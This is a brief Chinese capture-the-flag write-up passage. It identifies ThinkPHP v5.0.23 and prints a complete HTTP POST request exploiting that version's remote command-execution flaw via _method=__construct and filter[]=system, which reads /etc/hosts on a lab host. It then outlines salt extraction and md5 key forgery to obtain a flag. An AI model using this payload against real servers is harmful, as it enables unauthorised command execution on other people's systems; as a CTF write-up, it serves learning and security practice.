- 查看报错信息。thinkphp v5.0.23
- 想到最近刚出的命令执行漏洞
```
POST /index.php?s=captcha HTTP/1.1
Host: 192.168.227.137:8083
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=011535256e6679ea49ec3117db93644e
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 84

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat /etc/hosts
```
- 源码分析，在secret函数中得到salt，md5伪造key和res，session中level变为1，执行get_tag函数，得到flag。
